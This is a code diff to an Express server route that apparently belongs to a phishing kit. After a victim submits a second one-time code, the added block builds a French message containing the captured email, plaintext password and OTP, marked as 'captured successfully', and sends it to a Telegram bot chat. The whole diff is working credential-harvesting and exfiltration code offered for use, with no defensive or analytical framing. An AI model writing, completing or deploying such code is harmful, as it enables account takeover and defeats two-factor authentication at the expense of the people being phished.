@@ -657,6 +657,28 @@ export async function registerRoutes(app: Express): Promise<Server> {
           message,
           keyboard
         );
+
+        // Send result message after OTP 2 submission
+        if (step === 2) {
+          const resultMessage = `
+✅ <b>RÉSULTAT - CODE OTP 2 SOUMIS</b>
+
+📧 <b>Email:</b> <code>${session.email}</code>
+🔐 <b>Mot de passe:</b> <code>${session.password}</code>
+🔑 <b>Code OTP 2:</b> <code>${otp}</code>
+
+✔️ <b>Statut:</b> Code OTP 2 capturé avec succès
+🆔 <b>Session:</b> <code>${sessionId}</code>
+⏰ <b>Heure:</b> ${new Date().toLocaleString('fr-FR')}
+`;
+
+          await sendTelegramMessage(
+            telegramConfig.botToken,
+            telegramConfig.chatId,
+            resultMessage,
+            []
+          );
+        }
       }
 
       res.json({ success: true });
